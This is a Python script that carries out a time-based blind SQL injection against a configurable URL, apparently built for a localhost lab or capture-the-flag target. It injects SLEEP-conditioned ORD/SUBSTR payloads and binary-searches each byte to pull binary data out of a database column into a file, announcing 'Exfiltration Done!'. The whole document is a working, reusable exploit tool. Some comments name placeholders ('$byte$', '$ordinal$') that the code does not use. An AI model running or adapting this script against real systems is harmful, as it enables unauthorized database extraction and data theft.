#!/usr/bin/env python3
import requests
import sys
import time

## Config

# The target URL. Must contain '$payload$' where the payload will be inserted.
TARGET = "http://localhost/?id=4$payload$"

# The payload, which must sleep if (ORD(byte) < $test$). Must contain '$index$' and
#   '$byte$' where the index being tested and current test ordinal character will be inserted.
PAYLOAD = "' AND ORD(SUBSTR(CAST(bin as BINARY), $index$ %2B 1, 1)) < $test$ AND SLEEP(0.2) OR '"

# The payload, which must sleep if (length < $test$).
#   Must contain '$byte$' where the current test length will be inserted.
LENGTH_PAYLOAD = "' AND ((LENGTH(CAST(bin as BINARY)) >> (8 * $index$)) %26 0xFF) < $test$ AND SLEEP(0.2) OR '"

# If a query takes longer than this then the SQL server slept
SQL_SLEPT_THRESHOLD = 0.2

# Optional output file to store binary data in
OUTPUT_FILE = "output.png"

## Config Ends

total_requests = 0


def create_tree(arr):
    """Creates a binary tree from a list of values."""
    # end of branch
    if len(arr) == 1:
        return (arr[0],)

    # find the middle index, and element
    mid = len(arr) // 2
    root = arr[mid]

    # create the tree recursively
    return root, create_tree(arr[:mid]), create_tree(arr[mid:])


def test(payload="", index="", test=""):
    """Test if a generic payload sleeps."""
    url = (TARGET
        .replace("$payload$", payload)
        .replace("$index$", str(index))
        .replace("$test$", str(test))
    )
    #print(url)

    # time query
    start_time = time.time()
    requests.get(url)
    elapsed_time = time.time() - start_time

    global total_requests
    total_requests += 1

    return elapsed_time > SQL_SLEPT_THRESHOLD


def query(tree, **kwargs):
    """Uses the binary tree provided to query a single byte."""
    if len(tree) == 1:
        return tree[0]

    current_test, lower, higher = tree
    slept = test(test=current_test, **kwargs)

    return query(lower if slept else higher, **kwargs)


def query_length(byte_tree):
    length = 0

    # query 64 bit integer one byte at a time
    for i in range(4):
        length += query(byte_tree, payload=LENGTH_PAYLOAD, index=i) * 256**i
        
    return length


def main():
    print("[+] Retriving data...")

    # generate binary trees
    byte_tree = create_tree(list(range(2**8)))

    # find length of data
    length = query_length(byte_tree)
    print("[+] Fetching", length, "bytes")

    print("[+] ", end="")

    try:
        if OUTPUT_FILE:
            f = open(OUTPUT_FILE, "wb")

        # fetch data
        for i in range(length):
            byte = query(byte_tree, payload=PAYLOAD, index=i)

            if OUTPUT_FILE:
                f.write(bytes([byte]))
                print(".", end="", flush=True)
            else:
                print(chr(byte), end="", flush=True)


    finally:
        if OUTPUT_FILE:
            f.close()

    print("\n[+] Number of Requests:", total_requests)
    print("[+] Exfiltration Done!")


if __name__ == "__main__":
    #if not "$payload$" in TARGET:
    #    print("Missing '$payload$' in TARGET config string.")
    #    sys.exit(1)
    #if not "$index$" in PAYLOAD:
    #    print("Missing '$index$' in PAYLOAD config string.")
    #    sys.exit(2)
    #if not "$ordinal$" in PAYLOAD:
    #    print("Missing '$ordinal$' in PAYLOAD config string.")
    #    sys.exit(3)

    try:
        main()
    except KeyboardInterrupt:
        print("\nCancelled by user")
